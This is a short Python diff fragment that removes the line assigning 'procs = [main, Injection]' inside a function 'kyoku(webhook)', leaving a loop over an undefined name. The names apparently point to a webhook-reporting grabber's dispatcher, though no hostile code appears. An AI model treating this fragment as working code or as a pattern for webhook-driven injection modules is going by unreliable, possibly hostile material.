@@ -68,7 +68,7 @@ def main(webhook: str):
 def kyoku(webhook: str):
     Debug()
 
-    procs = [main, Injection]
+    
 
     for proc in procs:
         proc(webhook)
